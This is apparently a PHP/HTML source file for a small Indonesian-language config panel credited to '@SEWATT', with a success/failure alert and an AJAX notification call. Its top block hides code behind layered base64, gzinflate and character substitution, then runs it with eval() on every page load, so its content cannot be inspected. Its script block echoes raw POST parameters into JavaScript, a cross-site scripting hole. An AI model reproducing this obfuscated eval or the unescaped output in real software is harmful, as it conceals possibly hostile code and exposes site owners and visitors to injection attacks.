<?php

    /***
     * Coded by @SEWATT | SEWATTHoster.id
     * Please don't change this credit, respect me
     * All codes here are guaranteed security!
     */

    $SISTEMIT_COM_ENC = "4+Xi5dq6devrNA3F18+e/X6loRIf4B8cEq2U+yxdKVZTsxosDQK/k98+3Kpk8yy56HXBK7uch8lfX71+mKf3tuh3mq3667yPvyv0Ct4WqFvb6EOVKFmD9dYCKV4uAA==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="devrNA3F18+e/X6loRIf4B8cEq2U+yxdKVZTsxosDQK/k98+3Kpk8yy56HXBK7uch8lfX71+mKf3tuh3mq3667yPvyv0Ct4WqFvb6EOVKFmD9dYCKV4uAA==";

    /***
     * Coded by @SEWATT | SEWATTHoster.id
     * Please don't change this credit, respect me
     * All codes here are guaranteed security!
     */
    
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Config Panel - SEWATT</title>
    <link rel="stylesheet" href="config.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Signika+Negative:wght@500&display=swap" rel="stylesheet">
</head>
<style>
    *,body{padding:0;margin:0}.page,body{height:100%}*{font-family:'Signika Negative',sans-serif}html{-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;background-size:cover}.home{padding:25px}.page{background:rgba(234,255,0,.985);position:fixed;min-width:100%;min-height:100%}.buttonpage,.inputpage{padding:0 3% 3%;font-size:25px}.home .title{padding:60px 3% 3%;font-size:35px;font-weight:700}.tombol{padding-top:0}.high{color:#0062ff;font-size:25px;font-weight:700}@media screen and (max-width:600px){.home .title{font-size:25px}.buttonpage,.inputpage{padding-top:8%;font-size:16px}.high{font-size:20px}}
</style>
<body>
    <div class="page">
        <div class="home">
            <h1 class="title">@SEWATT Panel Config</h1>
            <div class="inputpage">
                <div class="alert alert-success" role="alert" id="ok">
                    Success! Data telah berhasil diubah. Klik <a href="index.php" class="alert-link">disini</a> untuk kembali ke menu utama.
                </div>
                <div class="alert alert-danger" role="alert" id="fail">
                    Failed! Terjadi kesalahan. Klik <a href="index.php" class="alert-link">disini</a> untuk kembali ke menu utama.
                </div>
            </div>
        </div>
    </div>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
<script>

    /***
     * Coded by @SEWATT | SEWATTHoster.id
     * Please don't change this credit, respect me
     * All codes here are guaranteed security!
     */

    $.ajax({type:"POST",url:"notif.php",data:{pada:"<?php echo $_POST['pada']; ?>",changed:"<?php echo $_POST['changed']; ?>"},dataType:"text",success:function(){return!0},error:function(){return!1}});var msg="<?php echo $_POST['msg']; ?>",msgOk=document.getElementById("ok"),msgFail=document.getElementById("fail");msgOk.style.display="none",msgFail.style.display="none","ok"==msg?msgOk.style.display="":"fail"==msg?msgFail.style.display="":console.log("false");
    
    /***
     * Coded by @SEWATT | SEWATTHoster.id
     * Please don't change this credit, respect me
     * All codes here are guaranteed security!
     */
    
</script>
</html>